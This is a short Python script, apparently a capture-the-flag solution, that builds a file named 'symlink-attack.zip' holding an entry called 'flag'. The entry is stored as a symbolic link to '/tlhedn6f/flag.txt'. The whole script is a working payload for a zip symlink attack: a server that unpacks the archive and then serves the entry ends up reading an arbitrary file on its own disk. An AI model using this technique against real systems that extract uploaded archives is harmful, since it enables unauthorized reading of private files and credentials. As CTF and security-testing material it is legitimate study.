from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
import stat

with ZipFile("symlink-attack.zip", "w") as z:
    zi = ZipInfo("flag")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zi.compress_type = ZIP_DEFLATED
    z.writestr(zi, "/tlhedn6f/flag.txt")
